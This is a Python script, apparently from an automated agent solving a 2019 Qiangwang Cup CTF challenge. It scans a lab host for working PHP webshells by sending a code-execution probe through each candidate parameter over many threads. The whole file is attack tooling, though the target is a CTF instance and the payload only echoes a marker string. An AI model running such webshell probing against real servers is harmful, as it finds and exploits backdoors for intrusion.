import requests
import threading

base_url = "http://b821ac5b-b6be-47ba-8e31-a1b10f4f407d.node5.buuoj.cn:81"

# 读取潜在webshell列表
shells = []
with open('/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/potential_shells.txt', 'r') as f:
    for line in f:
        parts = line.strip().split(':')
        if len(parts) == 4:
            shells.append((parts[0], parts[1], parts[2], parts[3]))

print(f"Testing {len(shells)} filtered shells...")

found = threading.Event()

def test_shell(shell_info):
    if found.is_set():
        return None
    
    filename, func, method, param = shell_info
    url = f"{base_url}/src/{filename}"
    
    try:
        if method == 'GET':
            r = requests.get(url, params={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=3)
            if 'SHELL_TEST_SUCCESS' in r.text:
                return (filename, func, method, param)
        else:  # POST
            r = requests.post(url, data={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=3)
            if 'SHELL_TEST_SUCCESS' in r.text:
                return (filename, func, method, param)
    except:
        pass
    return None

# 测试
from concurrent.futures import ThreadPoolExecutor, as_completed

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = {executor.submit(test_shell, shell): shell for shell in shells}
    for future in as_completed(futures):
        result = future.result()
        if result:
            found.set()
            print(f"\n[SUCCESS] {result[0]}: {result[1]}($_{result[2]}['{result[3]}'])")
            # 继续测试完所有，但标记已找到
            break

print("Test completed.")
